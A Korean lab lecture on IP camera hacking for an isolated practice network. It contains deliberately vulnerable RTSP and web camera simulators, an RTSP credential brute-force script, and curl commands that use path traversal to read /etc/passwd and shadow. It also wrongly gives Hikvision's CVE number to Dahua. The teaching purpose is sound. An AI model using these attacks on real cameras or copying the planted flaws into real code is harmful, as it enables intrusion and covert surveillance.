# Week 09: IP Camera 해킹

## 학습 목표
- IP 카메라의 아키텍처와 일반적인 취약점을 이해한다
- RTSP 프로토콜 분석 및 영상 스트림 가로채기를 실습한다
- 카메라 웹 인터페이스의 기본 인증 취약점을 공략한다
- 카메라 펌웨어에서 민감 정보를 추출한다
- IP 카메라 보안 강화 방안을 수립한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | IP 카메라 시뮬레이터 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | IP 카메라 보안 이론 (Part 1) | 강의 |
| 0:40-1:10 | RTSP 프로토콜 심화 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | RTSP 분석 실습 (Part 3) | 실습 |
| 2:00-2:40 | 카메라 웹 인터페이스 공격 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 카메라 보안 강화 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

## Part 1: IP 카메라 보안 이론 (40분)

### 1.1 IP 카메라 아키텍처

```
┌─────────────────────────────────────┐
│           IP Camera                  │
├─────────┬───────────┬───────────────┤
│ Camera  │ Processor │ Network       │
│ Sensor  │ (SoC)     │ Interface     │
│ (CMOS)  │ HiSilicon │ (WiFi/ETH)   │
│         │ Ambarella │               │
├─────────┴───────────┴───────────────┤
│              Firmware                │
│  ┌────────┬──────────┬────────────┐ │
│  │ U-Boot │ Linux    │ Web Server │ │
│  │        │ Kernel   │ (GoAhead)  │ │
│  ├────────┼──────────┼────────────┤ │
│  │ RTSP   │ ONVIF    │ P2P Cloud  │ │
│  │ Server │ Service  │ Service    │ │
│  └────────┴──────────┴────────────┘ │
└─────────────────────────────────────┘
```

### 1.2 IP 카메라 공격 표면

| 공격 표면 | 프로토콜/서비스 | 일반적 취약점 |
|-----------|----------------|---------------|
| 웹 인터페이스 | HTTP (80/443) | 기본 비밀번호, SQLi, 경로 탐색 |
| 영상 스트림 | RTSP (554) | 미인증 접근, 평문 전송 |
| 디바이스 관리 | ONVIF (80/8080) | XML 인젝션, 인증 우회 |
| 클라우드 연결 | P2P (다양) | 약한 UID, MitM |
| 펌웨어 업데이트 | HTTP/FTP | 서명 미검증, 다운그레이드 |
| 디버그 | Telnet (23) | 백도어 계정 |

### 1.3 주요 IP 카메라 취약점 사례

**Verkada (2021):**
- 15만대 보안 카메라 영상 유출
- 하드코딩된 슈퍼 관리자 계정 발견
- 병원, 교도소, Tesla 공장 영상 노출

**Hikvision (2021 - CVE-2021-36260):**
- 명령어 주입 취약점 (Critical CVSS 9.8)
- 인증 없이 원격 코드 실행 가능
- 전 세계 수백만 대 영향

**Dahua (2021 - CVE-2021-36260):**
- 인증 우회 취약점
- 기본 비밀번호: admin/admin, 888888/888888

---

## Part 2: RTSP 프로토콜 심화 (30분)

### 2.1 RTSP 프로토콜 개요

RTSP(Real Time Streaming Protocol)는 미디어 서버의 스트리밍을 제어하는 프로토콜이다.

**RTSP 메서드:**
```
DESCRIBE  → 미디어 정보 요청 (SDP)
SETUP     → 전송 채널 설정
PLAY      → 스트리밍 시작
PAUSE     → 일시 정지
TEARDOWN  → 세션 종료
OPTIONS   → 지원 메서드 확인
```

**RTSP URL 구조:**
```
rtsp://[username:password@]host[:port]/path

예시:
rtsp://admin:admin@192.168.1.100:554/Streaming/Channels/1
rtsp://192.168.1.100:554/live/ch0
rtsp://192.168.1.100:554/h264
rtsp://192.168.1.100:554/onvif/media/profile1
```

### 2.2 RTSP 통신 흐름

```
Client                          Camera (RTSP Server)
  │                                    │
  │──── OPTIONS rtsp://cam/live ──────→│
  │←─── 200 OK (Public: DESCRIBE...) ─│
  │                                    │
  │──── DESCRIBE rtsp://cam/live ─────→│
  │←─── 200 OK (SDP content) ─────────│
  │                                    │
  │──── SETUP rtsp://cam/live/track1 ─→│
  │←─── 200 OK (Transport: ...) ──────│
  │                                    │
  │──── PLAY rtsp://cam/live ─────────→│
  │←─── 200 OK ───────────────────────│
  │←─── [RTP 비디오 스트림 시작] ──────│
  │                                    │
```

### 2.3 일반적인 RTSP 경로

| 제조사 | RTSP 경로 |
|--------|-----------|
| Hikvision | `/Streaming/Channels/101` |
| Dahua | `/cam/realmonitor?channel=1&subtype=0` |
| Axis | `/axis-media/media.amp` |
| Samsung | `/profile2/media.smp` |
| Foscam | `/videoMain` |
| Generic | `/live`, `/h264`, `/stream`, `/ch0` |

---

## Part 3: RTSP 분석 실습 (40분)

### 3.1 RTSP 서버 시뮬레이터

```bash
# GStreamer 기반 RTSP 서버 또는 Python 시뮬레이터
cat << 'PYEOF' > /tmp/rtsp_simulator.py
#!/usr/bin/env python3
"""RTSP 카메라 시뮬레이터 (TCP 기반)"""
import socket
import threading
import time

class RTSPServer:
    def __init__(self, host='0.0.0.0', port=8554):
        self.host = host
        self.port = port
        self.sessions = {}
        self.auth_required = False  # 취약: 인증 비활성화
        self.credentials = {'admin': 'admin', 'root': 'camera123'}
    
    def handle_client(self, conn, addr):
        print(f"[+] RTSP 클라이언트 연결: {addr}")
        cseq = 0
        
        while True:
            try:
                data = conn.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                
                lines = data.strip().split('\r\n')
                method = lines[0].split(' ')[0] if lines else ''
                
                for line in lines:
                    if line.startswith('CSeq:'):
                        cseq = int(line.split(':')[1].strip())
                
                if method == 'OPTIONS':
                    response = (
                        f"RTSP/1.0 200 OK\r\n"
                        f"CSeq: {cseq}\r\n"
                        f"Public: DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN, OPTIONS\r\n"
                        f"Server: IoT-Camera/1.0\r\n\r\n"
                    )
                
                elif method == 'DESCRIBE':
                    sdp = (
                        "v=0\r\n"
                        "o=- 0 0 IN IP4 0.0.0.0\r\n"
                        "s=IoT Camera Stream\r\n"
                        "c=IN IP4 0.0.0.0\r\n"
                        "t=0 0\r\n"
                        "m=video 0 RTP/AVP 96\r\n"
                        "a=rtpmap:96 H264/90000\r\n"
                        "a=control:track1\r\n"
                    )
                    response = (
                        f"RTSP/1.0 200 OK\r\n"
                        f"CSeq: {cseq}\r\n"
                        f"Content-Type: application/sdp\r\n"
                        f"Content-Length: {len(sdp)}\r\n"
                        f"Server: IoT-Camera/1.0\r\n\r\n"
                        f"{sdp}"
                    )
                
                elif method == 'SETUP':
                    session_id = f"{int(time.time()):08X}"
                    response = (
                        f"RTSP/1.0 200 OK\r\n"
                        f"CSeq: {cseq}\r\n"
                        f"Session: {session_id};timeout=60\r\n"
                        f"Transport: RTP/AVP;unicast;client_port=5000-5001;server_port=6000-6001\r\n"
                        f"Server: IoT-Camera/1.0\r\n\r\n"
                    )
                
                elif method == 'PLAY':
                    response = (
                        f"RTSP/1.0 200 OK\r\n"
                        f"CSeq: {cseq}\r\n"
                        f"Range: npt=0.000-\r\n"
                        f"Server: IoT-Camera/1.0\r\n\r\n"
                    )
                
                else:
                    response = f"RTSP/1.0 501 Not Implemented\r\nCSeq: {cseq}\r\n\r\n"
                
                conn.send(response.encode())
                print(f"  [{addr}] {method} → 200 OK")
                
            except Exception as e:
                print(f"  [{addr}] Error: {e}")
                break
        
        conn.close()
        print(f"[-] RTSP 클라이언트 연결 해제: {addr}")
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[*] RTSP 서버 시작: rtsp://{self.host}:{self.port}/live")
        
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=self.handle_client, args=(conn, addr))
            thread.daemon = True
            thread.start()

if __name__ == '__main__':
    RTSPServer().start()
PYEOF

python3 /tmp/rtsp_simulator.py &
```

### 3.2 RTSP 정찰

```bash
# RTSP 서비스 스캔
nmap -sV -p 554,8554 10.20.30.80

# RTSP URL 브루트포스
cat << 'EOF' > /tmp/rtsp_paths.txt
/live
/h264
/stream
/ch0
/cam/realmonitor?channel=1&subtype=0
/Streaming/Channels/101
/onvif/media/profile1
/videoMain
/axis-media/media.amp
/live/ch0
/live.sdp
EOF

while read path; do
  echo -n "Testing rtsp://10.20.30.80:8554$path → "
  timeout 3 curl -s -o /dev/null -w "%{http_code}" \
    "rtsp://10.20.30.80:8554$path" 2>/dev/null || echo "timeout"
done < /tmp/rtsp_paths.txt

# RTSP OPTIONS 요청
cat << 'EOF' | nc -w 3 10.20.30.80 8554 2>/dev/null
OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0
CSeq: 1

EOF

# RTSP DESCRIBE (SDP 정보 수집)
cat << 'EOF' | nc -w 3 10.20.30.80 8554 2>/dev/null
DESCRIBE rtsp://10.20.30.80:8554/live RTSP/1.0
CSeq: 2

EOF
```

### 3.3 RTSP 인증 브루트포스

```bash
cat << 'PYEOF' > /tmp/rtsp_brute.py
#!/usr/bin/env python3
"""RTSP 인증 브루트포스"""
import socket

target = "10.20.30.80"
port = 8554
path = "/live"

credentials = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "password"),
    ("root", "root"), ("admin", ""), ("admin", "camera123"),
    ("admin", "888888"), ("admin", "666666"),
    ("operator", "operator"), ("admin", "admin123"),
]

def test_rtsp(host, port, path, user=None, pwd=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        url = f"rtsp://{host}:{port}{path}"
        if user:
            url = f"rtsp://{user}:{pwd}@{host}:{port}{path}"
        
        request = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        s.send(request.encode())
        response = s.recv(4096).decode(errors='ignore')
        s.close()
        
        if "200 OK" in response:
            return True, "200 OK"
        elif "401" in response:
            return False, "401 Unauthorized"
        else:
            code = response.split('\r\n')[0] if response else "No response"
            return False, code
    except Exception as e:
        return False, str(e)

# 미인증 접근 테스트
print("[*] 미인증 접근 테스트...")
success, code = test_rtsp(target, port, path)
if success:
    print(f"[!] 인증 없이 접근 가능! ({code})")
else:
    print(f"[-] 인증 필요: {code}")
    print("\n[*] 비밀번호 브루트포스 시작...")
    for user, pwd in credentials:
        success, code = test_rtsp(target, port, path, user, pwd)
        if success:
            print(f"[+] SUCCESS: {user}:{pwd} ({code})")
            break
        else:
            print(f"[-] Failed: {user}:{pwd}")
PYEOF

python3 /tmp/rtsp_brute.py
```

---

## Part 4: 카메라 웹 인터페이스 공격 (40분)

### 4.1 카메라 웹 시뮬레이터

```bash
cat << 'PYEOF' > /tmp/camera_web.py
#!/usr/bin/env python3
"""IP 카메라 웹 인터페이스 시뮬레이터"""
from flask import Flask, request, jsonify, redirect, session
import os

app = Flask(__name__)
app.secret_key = 'camera-secret'

# 취약한 설정
CAMERA_CONFIG = {
    "device_name": "IoT-Camera-01",
    "firmware": "v2.1.3",
    "rtsp_port": 554,
    "http_port": 80,
    "wifi_ssid": "Camera-AP",
    "wifi_password": "camera2024",
    "admin_password": "admin",
    "stream_url": "/live/ch0",
    "p2p_uid": "CAMID-123456-ABCDE",
}

@app.route('/')
def index():
    return '''<html><head><title>IP Camera</title></head><body>
    <h2>IoT Camera Web Interface</h2>
    <p>Server: GoAhead-Webs/2.5</p>
    <a href="/login.html">Login</a>
    </body></html>'''

@app.route('/login.html', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('user','')
        pwd = request.form.get('pwd','')
        if user == 'admin' and pwd == CAMERA_CONFIG['admin_password']:
            session['auth'] = True
            return redirect('/config.html')
    return '''<form method="POST">
    <input name="user" placeholder="Username">
    <input name="pwd" type="password" placeholder="Password">
    <button>Login</button></form>'''

# 취약: CGI 경로 탐색
@app.route('/cgi-bin/config.cgi')
def config_cgi():
    return jsonify(CAMERA_CONFIG)

# 취약: snapshot 미인증
@app.route('/snapshot.cgi')
def snapshot():
    return jsonify({"status": "ok", "image": "/tmp/snapshot.jpg"})

# 취약: 경로 탐색
@app.route('/cgi-bin/readfile.cgi')
def readfile():
    filename = request.args.get('file', '')
    # 취약: 입력 검증 없음
    try:
        path = f"/etc/{filename}"
        with open(path, 'r') as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "File not found", 404

@app.route('/api/config')
def api_config():
    return jsonify(CAMERA_CONFIG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8089, debug=True)
PYEOF

python3 /tmp/camera_web.py &
```

### 4.2 카메라 웹 인터페이스 공격

```bash
# 기본 비밀번호 시도
curl -X POST http://10.20.30.80:8089/login.html \
  -d "user=admin&pwd=admin" -v

# CGI 직접 접근 (인증 우회)
curl -s http://10.20.30.80:8089/cgi-bin/config.cgi | python3 -m json.tool

# 경로 탐색
curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../../etc/passwd"
curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=shadow"

# API 설정 정보 유출
curl -s http://10.20.30.80:8089/api/config | python3 -m json.tool

# 스냅샷 미인증 접근
curl -s http://10.20.30.80:8089/snapshot.cgi
```

---

## Part 5: 카메라 보안 강화 (30분)

### 5.1 IP 카메라 보안 체크리스트

| 항목 | 위험 | 대책 |
|------|------|------|
| 기본 비밀번호 | Critical | 강력한 비밀번호 설정 |
| RTSP 미인증 | Critical | Digest 인증 적용 |
| Telnet 활성화 | High | Telnet 비활성화 |
| P2P 클라우드 | High | 필요 시에만 활성화 |
| HTTP 평문 | Medium | HTTPS 적용 |
| 펌웨어 업데이트 | Medium | 최신 펌웨어 유지 |
| ONVIF 미인증 | High | ONVIF 인증 설정 |
| UPnP | Medium | UPnP 비활성화 |
| 네트워크 분리 | Medium | IoT VLAN 구성 |

### 5.2 네트워크 분리 설계

```
인터넷 ── [방화벽] ── [내부 네트워크]
                         │
                    ┌────┴────┐
                    │ VLAN 10 │ ← 업무 네트워크
                    │ (PC 등) │
                    ├─────────┤
                    │ VLAN 20 │ ← IoT/카메라 전용
                    │(카메라) │   (인터넷 차단)
                    ├─────────┤
                    │ VLAN 30 │ ← NVR/관리 서버
                    │ (NVR)   │   (제한적 접근)
                    └─────────┘
```

---

## Part 6: 과제 안내 (20분)

### 과제

- RTSP 시뮬레이터에 인증(Digest Authentication)을 추가하시오
- 카메라 웹 인터페이스의 경로 탐색 취약점을 패치하시오
- IP 카메라 보안 점검 보고서를 작성하시오

---

## 참고 자료

- RTSP RFC 2326: https://tools.ietf.org/html/rfc2326
- ONVIF 표준: https://www.onvif.org/
- IP Camera 보안: NIST SP 800-183
- Cameradar (RTSP 스캐너): https://github.com/Ullaakut/cameradar
